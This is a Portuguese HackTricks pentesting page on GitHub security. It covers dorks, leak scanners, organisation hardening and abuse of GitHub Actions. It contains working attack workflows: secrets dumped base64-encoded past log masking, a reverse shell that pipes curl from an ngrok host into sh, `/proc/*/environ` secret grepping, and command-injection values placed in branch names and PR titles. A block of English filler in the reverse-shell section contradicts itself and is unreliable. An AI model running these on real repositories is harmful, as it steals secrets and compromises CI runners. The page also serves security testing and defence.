# Seguran√ßa do Github

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no Github.

</details>

## O que √© o Github

(De [aqui](https://kinsta.com/knowledgebase/what-is-github/)) Em um n√≠vel alto, **o Github √© um site e um servi√ßo baseado em nuvem que ajuda os desenvolvedores a armazenar e gerenciar seu c√≥digo, al√©m de rastrear e controlar as altera√ß√µes feitas nele**.

### Informa√ß√µes b√°sicas

{% content-ref url="basic-github-information.md" %}
[basic-github-information.md](basic-github-information.md)
{% endcontent-ref %}

## Reconhecimento Externo

Os reposit√≥rios do Github podem ser configurados como p√∫blicos, privados e internos.

* **Privado** significa que **apenas** as pessoas da **organiza√ß√£o** poder√£o acess√°-los.
* **Interno** significa que **apenas** as pessoas da **empresa** (uma empresa pode ter v√°rias organiza√ß√µes) poder√£o acess√°-lo.
* **P√∫blico** significa que **toda a internet** poder√° acess√°-lo.

Caso voc√™ saiba o **usu√°rio, reposit√≥rio ou organiza√ß√£o que deseja atacar**, voc√™ pode usar **dorks do Github** para encontrar informa√ß√µes sens√≠veis ou procurar **vazamentos de informa√ß√µes sens√≠veis** **em cada reposit√≥rio**.

### Dorks do Github

O Github permite **pesquisar algo especificando como escopo um usu√°rio, um reposit√≥rio ou uma organiza√ß√£o**. Portanto, com uma lista de strings que v√£o aparecer pr√≥ximas a informa√ß√µes sens√≠veis, voc√™ pode facilmente **procurar por informa√ß√µes sens√≠veis potenciais em seu alvo**.

Ferramentas (cada ferramenta cont√©m sua lista de dorks):

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker) ([Lista de dorks](https://github.com/obheda12/GitDorker/tree/master/Dorks))
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks) ([Lista de dorks](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt))
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber) ([Lista de dorks](https://github.com/hisxo/gitGraber/tree/master/wordlists))

### Vazamentos do Github

Por favor, note que as dorks do Github tamb√©m s√£o destinadas a procurar vazamentos usando as op√ß√µes de pesquisa do Github. Esta se√ß√£o √© dedicada √†s ferramentas que ir√£o **baixar cada reposit√≥rio e procurar informa√ß√µes sens√≠veis neles** (at√© mesmo verificando uma certa profundidade de commits).

Ferramentas (cada ferramenta cont√©m sua lista de regexes):

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

{% hint style="warning" %}
Ao procurar vazamentos em um reposit√≥rio e executar algo como `git log -p`, n√£o se esque√ßa de que pode haver **outras branches com outros commits** contendo segredos!
{% endhint %}

### Forks Externos

√â poss√≠vel **comprometer reposit√≥rios abusando de pull requests**. Para saber se um reposit√≥rio √© vulner√°vel, voc√™ precisa ler principalmente as configura√ß√µes yaml do Github Actions. [**Mais informa√ß√µes sobre isso abaixo**](./#execution-from-a-external-fork).

## Refor√ßo da Organiza√ß√£o

### Privil√©gios dos Membros

Existem alguns **privil√©gios padr√£o** que podem ser atribu√≠dos aos **membros** da organiza√ß√£o. Eles podem ser controlados na p√°gina `https://github.com/organizations/<org_name>/settings/member_privileges` ou pela [**API de Organiza√ß√µes**](https://docs.github.com/en/rest/orgs/orgs).

* **Permiss√µes b√°sicas**: Os membros ter√£o a permiss√£o Nenhuma/Leitura/Escrita/Administra√ß√£o sobre os reposit√≥rios da organiza√ß√£o. O recomendado √© **Nenhuma** ou **Leitura**.
* **Fork de reposit√≥rio**: Se n√£o for necess√°rio, √© melhor **n√£o permitir** que os membros fa√ßam fork dos reposit√≥rios da organiza√ß√£o.
* **Cria√ß√£o de p√°ginas**: Se n√£o for necess√°rio, √© melhor **n√£o permitir** que os membros publiquem p√°ginas a partir dos reposit√≥rios da organiza√ß√£o. Se necess√°rio, voc√™ pode permitir a cria√ß√£o de p√°ginas p√∫blicas ou privadas.
* **Solicita√ß√µes de acesso a integra√ß√µes**: Com isso ativado, colaboradores externos poder√£o solicitar acesso para aplicativos do GitHub ou OAuth para acessar esta organiza√ß√£o e seus recursos. Geralmente √© necess√°rio, mas se n√£o for, √© melhor desativ√°-lo.
* _N√£o consegui encontrar essa informa√ß√£o na resposta da API, compartilhe se voc√™ encontrar_
* **Altera√ß√£o de visibilidade do reposit√≥rio**: Se ativado, **membros** com permiss√µes de **administra√ß√£o** para o **reposit√≥rio** poder√£o **alterar sua visibilidade**. Se desativado, apenas os propriet√°rios da organiza√ß√£o podem alterar a visibilidade do reposit√≥rio. Se voc√™ **n√£o** quer que as coisas sejam **p√∫blicas**, certifique-se de que isso est√° **desativado**.
* _N√£o consegui encontrar essa informa√ß√£o na resposta da API, compartilhe se voc√™ encontrar_
* **Exclus√£o e transfer√™ncia de reposit√≥rios**: Se ativado, membros com permiss√µes de **administra√ß√£o** para o reposit√≥rio poder√£o **excluir** ou **transferir** reposit√≥rios **p√∫blicos e privados**.
* _N√£o consegui encontrar essa informa√ß√£o na resposta da API, compartilhe se voc√™ encontrar_
* **Permitir que os membros criem equipes**: Se ativado, qualquer **membro** da organiza√ß√£o poder√° **criar** novas **equipes**. Se desativado, apenas os propriet√°rios da organiza√ß√£o podem criar novas equipes. √â melhor ter isso desativado.
* _N√£o consegui encontrar essa informa√ß√£o na resposta da API, compartilhe se voc√™ encontrar_
* **Mais coisas podem ser configuradas** nesta p√°gina, mas as anteriores s√£o as mais relacionadas √† seguran√ßa.
### Configura√ß√µes de A√ß√µes

V√°rias configura√ß√µes relacionadas √† seguran√ßa podem ser configuradas para a√ß√µes na p√°gina `https://github.com/organizations/<org_name>/settings/actions`.

{% hint style="info" %}
Observe que todas essas configura√ß√µes tamb√©m podem ser definidas independentemente em cada reposit√≥rio.
{% endhint %}

* **Pol√≠ticas de a√ß√µes do Github**: Isso permite indicar quais reposit√≥rios podem executar fluxos de trabalho e quais fluxos de trabalho devem ser permitidos. √â recomendado **especificar quais reposit√≥rios** devem ser permitidos e n√£o permitir que todas as a√ß√µes sejam executadas.
* [**API-1**](https://docs.github.com/en/rest/actions/permissions#get-allowed-actions-and-reusable-workflows-for-an-organization)**,** [**API-2**](https://docs.github.com/en/rest/actions/permissions#list-selected-repositories-enabled-for-github-actions-in-an-organization)
* **Fluxos de trabalho de pull request de fork de colaboradores externos**: √â recomendado **exigir aprova√ß√£o para todos** os colaboradores externos.
* _N√£o encontrei uma API com essas informa√ß√µes, compartilhe se voc√™ encontrar_
* **Executar fluxos de trabalho de pull requests de fork**: √â altamente **desencorajado executar fluxos de trabalho de pull requests**, pois os mantenedores da origem do fork ter√£o a capacidade de usar tokens com permiss√µes de leitura no reposit√≥rio de origem.
* _N√£o encontrei uma API com essas informa√ß√µes, compartilhe se voc√™ encontrar_
* **Permiss√µes de fluxo de trabalho**: √â altamente recomendado **dar apenas permiss√µes de leitura do reposit√≥rio**. √â desencorajado dar permiss√µes de grava√ß√£o e criar/aprovar pull requests para evitar o abuso do GITHUB\_TOKEN fornecido aos fluxos de trabalho em execu√ß√£o.
* [**API**](https://docs.github.com/en/rest/actions/permissions#get-default-workflow-permissions-for-an-organization)

### Integra√ß√µes

_Informe-me se voc√™ conhece o endpoint da API para acessar essas informa√ß√µes!_

* **Pol√≠tica de acesso de aplicativos de terceiros**: √â recomendado restringir o acesso a todos os aplicativos e permitir apenas os necess√°rios (ap√≥s revis√£o).
* **Aplicativos do GitHub instalados**: √â recomendado permitir apenas os necess√°rios (ap√≥s revis√£o).

## Reconhecimento e Ataques abusando de credenciais

Para este cen√°rio, vamos supor que voc√™ tenha obtido acesso a uma conta do GitHub.

### Com Credenciais de Usu√°rio

Se voc√™ de alguma forma j√° possui credenciais de um usu√°rio dentro de uma organiza√ß√£o, voc√™ pode **apenas fazer login** e verificar quais **fun√ß√µes de empresa e organiza√ß√£o voc√™ possui**, se voc√™ √© um membro comum, verifique quais **permiss√µes os membros comuns t√™m**, em quais **grupos** voc√™ est√°, quais **permiss√µes voc√™ tem** sobre quais **reposit√≥rios** e **como os reposit√≥rios est√£o protegidos**.

Observe que **a autentica√ß√£o de dois fatores (2FA) pode ser usada**, ent√£o voc√™ s√≥ poder√° acessar essas informa√ß√µes se tamb√©m conseguir **passar por essa verifica√ß√£o**.

{% hint style="info" %}
Observe que se voc√™ **conseguir roubar o cookie `user_session`** (atualmente configurado com SameSite: Lax), voc√™ pode **se passar completamente pelo usu√°rio** sem precisar de credenciais ou 2FA.
{% endhint %}

Verifique a se√ß√£o abaixo sobre [**burlas de prote√ß√£o de branch**](./#branch-protection-bypass) caso seja √∫til.

### Com Chave SSH de Usu√°rio

O Github permite que **usu√°rios** configurem **chaves SSH** que ser√£o usadas como **m√©todo de autentica√ß√£o para implantar c√≥digo** em seu nome (nenhum 2FA √© aplicado).

Com essa chave, voc√™ pode realizar **altera√ß√µes em reposit√≥rios onde o usu√°rio possui algumas permiss√µes**, no entanto, voc√™ n√£o pode us√°-la para acessar a API do GitHub para enumerar o ambiente. No entanto, voc√™ pode **enumerar as configura√ß√µes locais** para obter informa√ß√µes sobre os reposit√≥rios e usu√°rios aos quais voc√™ tem acesso:
```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```
Se o usu√°rio tiver configurado seu nome de usu√°rio como seu nome de usu√°rio do GitHub, voc√™ pode acessar as **chaves p√∫blicas que ele definiu** em sua conta em _https://github.com/\<github\_username>.keys_, voc√™ pode verificar isso para confirmar se a chave privada que voc√™ encontrou pode ser usada.

As **chaves SSH** tamb√©m podem ser definidas em reposit√≥rios como **chaves de implanta√ß√£o**. Qualquer pessoa com acesso a essa chave poder√° **iniciar projetos a partir de um reposit√≥rio**. Geralmente, em um servidor com diferentes chaves de implanta√ß√£o, o arquivo local **`~/.ssh/config`** fornecer√° informa√ß√µes sobre qual chave est√° relacionada.

#### Chaves GPG

Conforme explicado [**aqui**](broken-reference/), √†s vezes √© necess√°rio assinar os commits ou voc√™ pode ser descoberto.

Verifique localmente se o usu√°rio atual possui alguma chave com:
```shell
gpg --list-secret-keys --keyid-format=long
```
### Com Token de Usu√°rio

Para uma introdu√ß√£o sobre [**Tokens de Usu√°rio, verifique as informa√ß√µes b√°sicas**](basic-github-information.md#personal-access-tokens).

Um token de usu√°rio pode ser usado **em vez de uma senha** para o Git via HTTPS, ou pode ser usado para [**autenticar na API por Autentica√ß√£o B√°sica**](https://docs.github.com/v3/auth/#basic-authentication). Dependendo dos privil√©gios associados a ele, voc√™ pode ser capaz de realizar diferentes a√ß√µes.

Um token de usu√°rio se parece com isso: `ghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123`

### Com Aplicativo Oauth

Para uma introdu√ß√£o sobre [**Aplicativos Oauth do Github, verifique as informa√ß√µes b√°sicas**](basic-github-information.md#oauth-applications).

Um atacante pode criar um **Aplicativo Oauth malicioso** para acessar dados/a√ß√µes privilegiados dos usu√°rios que os aceitam, provavelmente como parte de uma campanha de phishing.

Esses s√£o os [escopos que um aplicativo Oauth pode solicitar](https://docs.github.com/en/developers/apps/building-oauth-apps/scopes-for-oauth-apps). Sempre verifique os escopos solicitados antes de aceit√°-los.

Al√©m disso, como explicado nas informa√ß√µes b√°sicas, **organiza√ß√µes podem conceder/negar acesso a aplicativos de terceiros** a informa√ß√µes/reposit√≥rios/a√ß√µes relacionadas √† organiza√ß√£o.

### Com Aplicativo Github

Para uma introdu√ß√£o sobre [**Aplicativos Github, verifique as informa√ß√µes b√°sicas**](basic-github-information.md#github-applications).

Um atacante pode criar um **Aplicativo Github malicioso** para acessar dados/a√ß√µes privilegiados dos usu√°rios que os aceitam, provavelmente como parte de uma campanha de phishing.

Al√©m disso, como explicado nas informa√ß√µes b√°sicas, **organiza√ß√µes podem conceder/negar acesso a aplicativos de terceiros** a informa√ß√µes/reposit√≥rios/a√ß√µes relacionadas √† organiza√ß√£o.

## Abusando do Github Action

Para uma introdu√ß√£o sobre [**Github Actions, verifique as informa√ß√µes b√°sicas**](basic-github-information.md#github-actions).

Caso voc√™ possa **executar a√ß√µes do Github arbitrariamente** em um **reposit√≥rio**, voc√™ pode **roubar as informa√ß√µes secretas desse reposit√≥rio**.

### Execu√ß√£o a partir da Cria√ß√£o do Reposit√≥rio

Caso membros de uma organiza√ß√£o possam **criar novos reposit√≥rios** e voc√™ possa executar a√ß√µes do Github, voc√™ pode **criar um novo reposit√≥rio e roubar as informa√ß√µes secretas definidas no n√≠vel da organiza√ß√£o**.

### Execu√ß√£o a partir de um Novo Branch

Se voc√™ pode **criar um novo branch em um reposit√≥rio que j√° cont√©m uma A√ß√£o do Github** configurada, voc√™ pode **modific√°-la**, **fazer upload** do conte√∫do e, em seguida, **executar essa a√ß√£o a partir do novo branch**. Dessa forma, voc√™ pode **extrair informa√ß√µes secretas do reposit√≥rio e da organiza√ß√£o** (mas voc√™ precisa saber como elas s√£o chamadas).

Voc√™ pode tornar a a√ß√£o modificada execut√°vel **manualmente**, quando um **PR √© criado** ou quando **algum c√≥digo √© enviado** (dependendo de qu√£o barulhento voc√™ deseja ser):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
### Execu√ß√£o a partir de um Fork Externo

Se um reposit√≥rio estiver usando a√ß√µes do GitHub, um invasor pode ser capaz de **criar uma Pull Request a partir de um reposit√≥rio fork** injetando **c√≥digo malicioso** no **fluxo de trabalho** do GitHub e pode ser capaz de **comprometer o reposit√≥rio do GitHub** dessa forma.

#### `pull_request`

O gatilho do fluxo de trabalho **`pull_request`** por padr√£o **impede permiss√µes de escrita** e **acesso a segredos** no reposit√≥rio de destino. Al√©m disso, por padr√£o, se for a **primeira vez** que voc√™ est√° **colaborando**, algum **mantenedor** precisar√° **aprovar** a **execu√ß√£o** do fluxo de trabalho:

<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Como a **limita√ß√£o padr√£o** √© para **contribuidores de primeira vez**, voc√™ pode contribuir **corrigindo um bug v√°lido** e depois enviar **outras PRs para abusar de seus novos privil√©gios de `pull_request`**.

**Testei isso e n√£o funciona**: ~~Outra op√ß√£o seria criar uma conta com o nome de algu√©m que contribuiu para o projeto e excluiu sua conta.~~
{% endhint %}

No entanto, para **prevenir** a **comprometimento** do **reposit√≥rio** via **`pull_request`**, isso √© mencionado na [**documenta√ß√£o**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Com exce√ß√£o do `GITHUB_TOKEN`, **os segredos n√£o s√£o passados para o executor** quando um fluxo de trabalho √© acionado a partir de um reposit√≥rio fork. O **`GITHUB_TOKEN` tem permiss√µes somente leitura** em pull requests **de reposit√≥rios fork**.

Um invasor pode modificar a defini√ß√£o da A√ß√£o do GitHub para executar coisas arbitr√°rias e anexar a√ß√µes arbitr√°rias. No entanto, ele n√£o poder√° roubar segredos ou sobrescrever o reposit√≥rio por causa das limita√ß√µes mencionadas.

No entanto, mesmo que a a√ß√£o n√£o mencione Artefatos, ele pode ser capaz de modificar um Artefato do reposit√≥rio alterando a a√ß√£o?? (TODO).

{% hint style="danger" %}
**Sim, se o invasor alterar na PR a a√ß√£o do GitHub que ser√° acionada, a A√ß√£o do GitHub dele ser√° a usada e n√£o a do reposit√≥rio de origem!**
{% endhint %}

_No entanto, o envio de uma nova a√ß√£o que √© acionada em pull\_request n√£o ser√° acionado._

#### **`pull_request_target`**

No entanto, o gatilho do fluxo de trabalho **`pull_request_target`** tem **permiss√£o de escrita** no reposit√≥rio de destino e **acesso a segredos** (e n√£o solicita permiss√£o).

Observe que o gatilho do fluxo de trabalho **`pull_request_target`** **√© executado no contexto base** e n√£o no contexto fornecido pela PR (para n√£o executar c√≥digo n√£o confi√°vel). Para mais informa√ß√µes sobre `pull_request_target`, [**verifique a documenta√ß√£o**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Al√©m disso, para mais informa√ß√µes sobre esse uso espec√≠fico perigoso, verifique este [**post no blog do GitHub**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Pode parecer que, porque o **fluxo de trabalho executado** √© o definido na **base** e n√£o na PR, √© **seguro** usar **`pull_request_target`**, mas existem **alguns casos em que n√£o √©**.

#### Inje√ß√£o de script por meio de vari√°veis controladas pelo invasor

O GitHub define [vari√°veis de ambiente padr√£o](https://docs.github.com/en/actions/learn-github-actions/environment-variables) e, se os contextos forem usados, ele [inclui mais](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context). Se algum desses **valores** for usado em um **local perigoso** dentro do fluxo de trabalho e puder ser **controlado pelo invasor**, pode ocorrer uma **inje√ß√£o de comando**.\
Essa vulnerabilidade tamb√©m √© [**explicada posteriormente neste post**](./#understanding-the-risk-of-script-injections).

#### Execu√ß√£o de checkout n√£o confi√°vel

Se a v√≠tima estiver usando **`pull_request`** ou similar para acionar a a√ß√£o, nenhuma PR de um fork ser√° executada **at√© que seja especificamente aprovada**. A a√ß√£o ent√£o ser√° **executada no contexto da PR** (bom porque isso significa que executar√° o c√≥digo dentro do fork das PRs), mas **algu√©m precisa aprov√°-la primeiro**.

Se a v√≠tima configurou o checkout para usar explicitamente o gatilho **`pull_request_target`**, ele ser√° **sempre** executado, mas usando o c√≥digo do reposit√≥rio base (n√£o o da PR), ent√£o o **invasor n√£o pode controlar o c√≥digo executado**.\
No entanto, se a **a√ß√£o** tiver um **checkout expl√≠cito da PR** que **obter√° o c√≥digo da PR** (e n√£o da base), ele usar√° o c√≥digo controlado pelo invasor. Por exemplo (verifique a linha 12 onde o c√≥digo da PR √© baixado):
```yaml
# INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
with:
ref: ${{ github.event.pull_request.head.sha }}

- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
```
O c√≥digo potencialmente **n√£o confi√°vel √© executado durante `npm install` ou `npm build`** como scripts de constru√ß√£o e pacotes referenciados s√£o controlados pelo autor do PR.

{% hint style="danger" %}
Se a a√ß√£o for executada em um runner auto-hospedado, o atacante pode ser capaz de compromet√™-lo ainda mais o ambiente.
{% endhint %}

Um dork do Github para pesquisar por a√ß√µes vulner√°veis √©: `event.pull_request pull_request_target extension:yml`, no entanto, existem diferentes maneiras de configurar os jobs para serem executados com seguran√ßa, mesmo se a a√ß√£o for configurada de forma insegura (como usar condicionais sobre quem √© o ator gerando o PR).

### Inje√ß√£o/Backdoor de A√ß√£o do Github

Caso voc√™ de alguma forma tenha conseguido **infiltrar-se dentro de uma A√ß√£o do Github**, se voc√™ puder elevar privil√©gios, voc√™ pode **roubar segredos dos processos onde os segredos foram definidos**. Em alguns casos, voc√™ nem precisa elevar privil√©gios.
```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```
### A√ß√£o do Github acessando AWS e GCP via OIDC

Verifique as seguintes p√°ginas:

{% content-ref url="../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Informa√ß√µes sens√≠veis nos logs das A√ß√µes do Github

Mesmo que o **Github** tente **detectar valores secretos** nos logs das a√ß√µes e **evite mostr√°-los**, **outros dados sens√≠veis** que possam ter sido gerados durante a execu√ß√£o da a√ß√£o n√£o ser√£o ocultados. Por exemplo, um JWT assinado com um valor secreto n√£o ser√° ocultado, a menos que seja [configurado especificamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

### GITHUB\_TOKEN

Este "**segredo**" (vindo de `${{ secrets.GITHUB_TOKEN }}` e `${{ github.token }}`) √© fornecido quando o administrador habilita essa op√ß√£o:

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Este token √© o mesmo que um **Aplicativo do Github usar√°**, para que ele possa acessar os mesmos endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
O Github deve lan√ßar um [**fluxo**](https://github.com/github/roadmap/issues/74) que **permite acesso entre reposit√≥rios** no GitHub, para que um reposit√≥rio possa acessar outros reposit√≥rios internos usando o `GITHUB_TOKEN`.
{% endhint %}

Voc√™ pode ver as poss√≠veis **permiss√µes** deste token em: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Observe que o token **expira ap√≥s a conclus√£o do trabalho**.\
Esses tokens se parecem com isso: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algumas coisas interessantes que voc√™ pode fazer com este token:
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'

# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'

# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% hint style="danger" %}
Observe que em v√°rias ocasi√µes voc√™ poder√° encontrar **tokens de usu√°rio do Github dentro das vari√°veis de ambiente do Github Actions ou nos segredos**. Esses tokens podem conceder a voc√™ mais privil√©gios sobre o reposit√≥rio e a organiza√ß√£o.
{% endhint %}

#### Listar segredos na sa√≠da do Github Action
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
#### Obter shell reverso com segredos

To get a reverse shell with secrets, you can leverage the power of environment variables and securely store your secrets. Here's how you can do it:

1. Identify the secrets you need for your reverse shell, such as the IP address and port of your listener.
2. Store these secrets as environment variables in your CI/CD pipeline or in your local development environment. Make sure to encrypt or protect these variables to prevent unauthorized access.
3. In your code, retrieve the values of these environment variables and use them to establish a reverse shell connection.
4. Ensure that the reverse shell connection is secure and encrypted to protect your communication.

By following these steps, you can obtain a reverse shell while keeping your secrets secure and minimizing the risk of unauthorized access. Remember to always handle secrets with care and follow best practices for secure coding and deployment.
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
### Inje√ß√µes de Scripts <a href="#entendendo-o-risco-de-injecoes-de-scripts" id="entendendo-o-risco-de-injecoes-de-scripts"></a>

Observe que existem certos [**contextos do github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cujos valores s√£o **controlados** pelo **usu√°rio** que cria o PR. Se a a√ß√£o do github estiver usando esses **dados para executar qualquer coisa**, isso pode levar √† **execu√ß√£o arbitr√°ria de c√≥digo**. Esses contextos geralmente terminam com `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref` e `title`. Por exemplo (lista retirada deste [**artigo**](https://medium.com/tinder/exploiting-github-actions-on-open-source-projects-5d93936d189f)):

* github.event.comment.body
* github.event.issue.body
* github.event.issue.title
* github.head\_ref
* github.pull\_request.\*
* github.\*.\*.authors.name
* github.\*.\*.authors.email

Observe que existem **fontes menos √≥bvias** de entrada potencialmente n√£o confi√°vel, como nomes de branches e endere√ßos de e-mail, que podem ser **bastante flex√≠veis em termos de seu conte√∫do permitido**. Por exemplo, `zzz";echo${IFS}"hello";#` seria um nome de branch v√°lido e poderia ser um vetor de ataque poss√≠vel para um reposit√≥rio alvo.

#### Exemplo de um ataque de inje√ß√£o de script <a href="#exemplo-de-um-ataque-de-injecao-de-script" id="exemplo-de-um-ataque-de-injecao-de-script"></a>

Um ataque de inje√ß√£o de script pode ocorrer diretamente dentro do script inline de um fluxo de trabalho. No exemplo a seguir, uma a√ß√£o usa uma **express√£o para testar a validade do t√≠tulo de uma solicita√ß√£o de pull**, mas tamb√©m adiciona o risco de inje√ß√£o de script:
```yaml
- name: Check PR title
run: |
title="${{ github.event.pull_request.title }}"
if [[ $title =~ ^octocat ]]; then
echo "PR title starts with 'octocat'"
exit 0
else
echo "PR title did not start with 'octocat'"
exit 1
fi
```
Antes de executar o script shell, as express√µes dentro de `${{ }}` s√£o **avaliadas** e, em seguida, substitu√≠das pelos valores resultantes, o que pode torn√°-las **vulner√°veis √† inje√ß√£o de comandos shell**.

Para injetar comandos neste fluxo de trabalho, o atacante poderia criar uma solicita√ß√£o de pull com um t√≠tulo de `a"; ls $GITHUB_WORKSPACE"`:

![Exemplo de inje√ß√£o de script no t√≠tulo do PR](https://docs.github.com/assets/cb-24920/images/help/images/example-script-injection-pr-title.png)

Neste exemplo, o caractere `"` √© usado para interromper a declara√ß√£o `title="${{ github.event.pull_request.title }}"`, permitindo que o comando `ls` seja executado no runner. Voc√™ pode ver a sa√≠da do comando `ls` no log:

![Exemplo de resultado de inje√ß√£o de script](https://docs.github.com/assets/cb-28350/images/help/images/example-script-injection-result.png)

### Acessando segredos <a href="#accessing-secrets" id="accessing-secrets"></a>

Se voc√™ estiver injetando conte√∫do em um script, √© interessante saber como acessar segredos:

* Se o segredo ou token for definido como uma **vari√°vel de ambiente**, ele pode ser acessado diretamente por meio do ambiente usando **`printenv`**.
* Se o segredo for usado **diretamente em uma express√£o**, o script shell gerado √© armazenado **em disco** e √© acess√≠vel.
* Para uma **a√ß√£o personalizada**, o risco pode variar dependendo de como um programa est√° usando o segredo obtido do **argumento**:

```
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusando de runners auto-hospedados

A maneira de descobrir quais **A√ß√µes do Github est√£o sendo executadas em infraestrutura n√£o-Github** √© procurar por `runs-on: self-hosted` no arquivo de configura√ß√£o da A√ß√£o do Github.

Os runners **auto-hospedados** podem ter acesso a **informa√ß√µes extra sens√≠veis**, a outros **sistemas de rede** (pontos finais vulner√°veis na rede? servi√ßo de metadados?) ou, mesmo que esteja isolado e destru√≠do, **mais de uma a√ß√£o pode ser executada ao mesmo tempo** e a maliciosa pode **roubar os segredos** da outra.

### Envenenamento de Cache

Usando a a√ß√£o [**action/cache**](https://github.com/actions/cache) do Git em qualquer CI, ser√£o executadas duas etapas: uma etapa ocorrer√° durante o processo de **execu√ß√£o** quando for chamada e a outra ocorrer√° ap√≥s o **fluxo de trabalho** (se a a√ß√£o de execu√ß√£o retornar uma falha de cache).

* A√ß√£o de **execu√ß√£o** - √© usada para pesquisar e recuperar o cache. A pesquisa √© feita usando a chave do cache, com o resultado sendo um cache-hit (sucesso, dados encontrados no cache) ou cache-miss. Se encontrado, os arquivos e diret√≥rios s√£o recuperados do cache para uso ativo. Se o resultado for cache-miss, os arquivos e diret√≥rios desejados s√£o baixados como se fosse a primeira vez que s√£o chamados.
